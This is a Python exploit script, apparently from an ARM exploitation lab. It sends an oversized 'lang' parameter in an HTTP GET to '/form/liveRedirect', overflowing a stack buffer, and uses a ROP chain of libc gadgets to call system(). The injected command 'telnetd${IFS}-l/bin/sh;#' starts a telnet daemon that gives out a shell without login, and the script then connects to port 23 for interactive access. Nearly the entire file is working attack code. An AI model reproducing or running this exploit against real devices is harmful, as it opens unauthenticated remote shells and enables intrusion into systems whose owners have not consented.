#!/usr/bin/python
from telnetlib import Telnet
import os, struct, sys, re, socket
import time

##### HELPER FUNCTIONS #####

def pack32(value):
    return struct.pack("<I", value)  # little byte order

def pack16n(value):
    return struct.pack(">H", value)  # big/network byte order

def urlencode(buf):
    s = ""
    for b in buf:
        if re.match(r"[a-zA-Z0-9\/]", b) is None:
            s += "%%%02X" % ord(b)
        else:
            s += b
    return s

##### HELPER FUNCTIONS FOR ROP CHAINING #####

# function to create a libc gadget
# requires a global variable called libc_base
def libc(offset):
    return pack32(libc_base + offset)

# function to represent data on the stack
def data(data):
    return pack32(data)

# function to check for bad characters
# run this before sending out the payload
# e.g. detect_badchars(payload, "\x00\x0a\x0d/?")
def detect_badchars(string, badchars):
    for badchar in badchars:
        i = string.find(badchar)
        while i != -1:
            sys.stderr.write("[!] 0x%02x appears at position %d\n" % (ord(badchar), i))
            i = string.find(badchar, i+1)

##### MAIN #####

if len(sys.argv) != 3:
    print("Usage: expl.py <ip> <port>")
    sys.exit(1)

ip = sys.argv[1]
port = sys.argv[2]

libc_base = 0x40021000

buf = "A" * 284
#buf += "BBBB"

"""
0x40060b58 <+32>:    ldr     r0, [sp, #4]
0x40060b5c <+36>:    pop     {r1, r2, r3, lr}
0x40060b60 <+40>:    bx      lr
"""
ldr_r0_sp = pack32(0x40060b58)

# 0x00033a98: mov r0, sp; mov lr, pc; bx r3;
mov_r0 = pack32(libc_base + 0x00033a98)
system = pack32(0x4006079c)

buf += ldr_r0_sp


buf += "BBBB"
buf += "CCCC"
#buf += "DDDD"
buf += system
#buf += "EEEE"
buf += mov_r0
buf += "telnetd${IFS}-l/bin/sh;#"

"""
buf += "FFFF"
buf += "GGGG"
buf += "HHHH"
"""


buf += "C" * (400-len(buf))

lang = buf

request = "GET /form/liveRedirect?lang=%s HTTP/1.0\n" % lang + \
    "Host: BBBBBBBBBBBB\nUser-Agent: ARM/exploitlab\n\n"

#print request,


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ip, int(port)))
s.send(request)
s.recv(100)

time.sleep(2)
tn = Telnet(ip, 23)
tn.interact()


